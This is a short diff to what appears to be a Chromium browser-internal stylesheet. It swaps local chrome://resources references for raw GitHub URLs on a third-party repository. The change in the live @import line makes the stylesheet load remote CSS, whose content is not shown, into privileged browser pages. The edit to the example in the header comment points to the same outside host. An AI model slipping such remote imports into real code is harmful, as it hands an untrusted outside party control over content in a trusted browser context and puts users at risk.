@@ -9,13 +9,13 @@
  * There are two ways to include this stylesheet:
  * 1. via its chrome://resources/ URL in HTML, i.e.:
  *
- *   <link rel="stylesheet" href="chrome://resources/css/text_defaults_md.css">
+ *   <link rel="stylesheet" href="https://raw.githubusercontent.com/Hilfig3rStorage/chromemethod/main/resources/css/test">
  *
  * 2. via the webui::AppendWebUICSSTextDefaultsMd() method to directly append it
  * to an HTML string.
  * Otherwise its placeholders won't be expanded. */
 
-@import url(chrome://resources/css/roboto.css);
+@import url(https://raw.githubusercontent.com/Hilfig3rStorage/chromemethod/main/resources/css/test2);
 
 body {
   font-family: Roboto, Roboto, sans-serif;
